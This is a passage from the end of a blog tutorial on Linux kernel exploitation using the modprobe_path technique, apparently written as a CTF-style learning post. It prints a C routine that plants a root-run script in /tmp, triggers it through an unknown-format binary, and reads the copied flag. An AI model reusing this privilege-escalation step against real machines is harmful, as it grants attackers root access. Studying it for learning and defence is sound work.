+<div class="highlight"><pre class="chroma"><code class="language-C" data-lang="C"><span class="kt">void</span> <span class="nf">get_flag</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[*] Returned to userland, setting up for fake modprobe&#34;</span><span class="p">);</span>
+    
+    <span class="n">system</span><span class="p">(</span><span class="s">&#34;echo &#39;#!/bin/sh</span><span class="se">\n</span><span class="s">cp /dev/sda /tmp/flag</span><span class="se">\n</span><span class="s">chmod 777 /tmp/flag&#39; &gt; /tmp/x&#34;</span><span class="p">);</span>
+    <span class="n">system</span><span class="p">(</span><span class="s">&#34;chmod +x /tmp/x&#34;</span><span class="p">);</span>
+
+    <span class="n">system</span><span class="p">(</span><span class="s">&#34;echo -ne &#39;</span><span class="se">\\</span><span class="s">xff</span><span class="se">\\</span><span class="s">xff</span><span class="se">\\</span><span class="s">xff</span><span class="se">\\</span><span class="s">xff&#39; &gt; /tmp/dummy&#34;</span><span class="p">);</span>
+    <span class="n">system</span><span class="p">(</span><span class="s">&#34;chmod +x /tmp/dummy&#34;</span><span class="p">);</span>
+
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[*] Run unknown file&#34;</span><span class="p">);</span>
+    <span class="n">system</span><span class="p">(</span><span class="s">&#34;/tmp/dummy&#34;</span><span class="p">);</span>
+
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[*] Hopefully flag is readable&#34;</span><span class="p">);</span>
+    <span class="n">system</span><span class="p">(</span><span class="s">&#34;cat /tmp/flag&#34;</span><span class="p">);</span>
+
+    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div><p>If all goes well and correctly, the flag should be printed out.</p>
+<h2 id="conclusion">Conclusion</h2>
+<p>Up until this point, I think we can all understand why this technique is so loved by pwners. I am actually very amazed when I understood it and wrote an exploit using it by myself, because it is literally the best of both worlds in the sense that it is not only simple to understand and deliver, but also has minimal prerequisites. That&rsquo;s why I have to immediately write this post, I hope it is useful for the readers, and feel free to correct me if I&rsquo;m wrong at any point or if there is any misinformation in the post.</p>
+<h2 id="appendix">Appendix</h2>
+<p>The full exploit code is <a href="/posts/20210223-linux-kernel-pwn-modprobe/modprobe.c" rel="">modprobe.c</a>.</p></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2021-02-23</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/20210205-linux-kernel-pwn-part-3/" class="prev" rel="prev" title="Learning Linux Kernel Exploitation - Part 3"><i class="fas fa-angle-left fa-fw"></i>Learning Linux Kernel Exploitation - Part 3</a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.80.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":60},"comment":{}};</script><script type="text/javascript" src="/js/theme.min.js"></script><script type="text/javascript">
+            window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
+            gtag('config', 'G-HGQHGNF9HJ');
+        </script><script type="text/javascript" src="https://www.googletagmanager.com/gtag/js?id=G-HGQHGNF9HJ" async></script></body>
+</html>
